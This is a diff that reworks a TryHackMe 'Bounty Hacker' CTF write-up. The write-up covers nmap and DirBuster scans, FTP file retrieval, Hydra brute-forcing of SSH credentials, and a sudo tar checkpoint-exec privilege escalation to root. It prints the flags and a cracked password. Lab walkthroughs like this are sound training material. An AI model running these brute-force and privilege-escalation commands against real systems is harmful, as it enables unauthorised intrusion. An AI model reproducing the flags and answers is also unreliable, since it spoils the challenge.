@@ -1,56 +1,35 @@
 # Bounty Hacker
 
-IP: 10.10.0.34
+IP -- 10.10.0.34
 
-1. Nmap Scan
+## Scans
 
-    * Open Ports:
+### Nmap
 
+Initial nmap scan:
+```bash
+nmap -sC -sV -oN scans/nmap.initial 10.10.0.34
+```
+
+Open Ports Found:
 ```
 21 -- ftp
 22 -- ssh
 80 -- webpage
 ```
 
-2. Dirbuster Scan
+### DirBuster
 
-    * Directories found:
-
+Directories found:
 ```
 /images
-/icons -- 404
-/icons/small -- 403
+/icons -- 404 Not Found
+/icons/small -- 403 Forbidden
 ```
 
-3. Enum4linux
+## FTP
 
-```
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-```
-
-4. Hydra on user *ftp* 
-```bash
-hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://10.10.0.34
-
-[21][ftp] host: 10.10.0.34   login: ftp   password: 123456
-[21][ftp] host: 10.10.0.34   login: ftp   password: 12345
-[21][ftp] host: 10.10.0.34   login: ftp   password: 123456789
-[21][ftp] host: 10.10.0.34   login: ftp   password: 1234567
-[21][ftp] host: 10.10.0.34   login: ftp   password: babygirl
-[21][ftp] host: 10.10.0.34   login: ftp   password: monkey
-[21][ftp] host: 10.10.0.34   login: ftp   password: jessica                                   
-[21][ftp] host: 10.10.0.34   login: ftp   password: password                                  
-[21][ftp] host: 10.10.0.34   login: ftp   password: iloveyou                                  
-[21][ftp] host: 10.10.0.34   login: ftp   password: princess                                  
-[21][ftp] host: 10.10.0.34   login: ftp   password: rockyou                                   
-[21][ftp] host: 10.10.0.34   login: ftp   password: 12345678                                  
-[21][ftp] host: 10.10.0.34   login: ftp   password: abc123
-[21][ftp] host: 10.10.0.34   login: ftp   password: nicole
-[21][ftp] host: 10.10.0.34   login: ftp   password: daniel
-[21][ftp] host: 10.10.0.34   login: ftp   password: lovely
-```
-
-5. Ftp -- transfering over target's files
+Connecting to FTP and `GET`ting files
 ```
 ftp> open
 (to) 10.10.0.34
@@ -64,28 +43,39 @@ ftp> get
 (local-file) locks.txt
 ```
 
-6. Hydra on user *lin* for SSH credentials
+found username `lin` in `task.txt` and wordlist `locks.txt`
 
-    - ssh -- lin:RedDr4gonSynd1cat3
+
+## Hydra 
+
+Bruteforcing username `lin` with `locks.txt` pwlist
 ```
 hydra -l lin -P locks.txt 10.10.0.34 -t 4 ssh
-
-[22][ssh] host: 10.10.0.34   login: lin   password: RedDr4gonSynd1cat3
 ```
 
-7. SSH into the machine and user flag found
+found credentials `lin:RedDr4gonSynd1cat3`
 
-    - user flag -- THM{CR1M3_SyNd1C4T3}
+
+## SSH into Machine
+
 ```
 ssh lin@10.10.0.34
-ls
-cat user.txt
-
-THM{CR1M3_SyNd1C4T3}
 ```
 
-8. root access
+User flag found `THM{CR1M3_SyNd1C4T3}`
 
+Privesc by:
+```bash
+sudo -l
+```
+
+and searching for `tar` on [gtfoBin](https://gtfobins.github.io/gtfobins/tar/)
+
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+Root flag found `THM{80UN7Y_h4cK3r}`
 
 ---
 [back to TryHackMe main page](thm.md)
